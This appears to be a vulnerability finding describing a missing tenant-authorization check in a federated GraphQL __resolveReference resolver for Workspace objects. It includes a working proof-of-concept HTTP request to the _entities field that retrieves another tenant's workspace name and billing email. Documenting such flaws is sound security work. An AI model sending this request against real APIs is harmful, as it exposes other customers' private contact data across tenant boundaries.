diagnosis: The federated GraphQL entity reference resolver __resolveReference loads Workspace objects solely by reference.id without verifying whether context.user is an authorized member of that workspace. When a client executes a federated query traversing into Workspace, the resolver returns the workspace name and sensitive billing contact details across tenant boundaries.
exploit_request:
POST /graphql HTTP/1.1
Host: subgraph.workspacehub.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsIn...
Content-Type: application/json

{
  "query": "query { _entities(representations: [{ __typename: \"Workspace\", id: \"ws_financial_advisors_77\" }]) { ... on Workspace { id name billingEmail } } }"
}
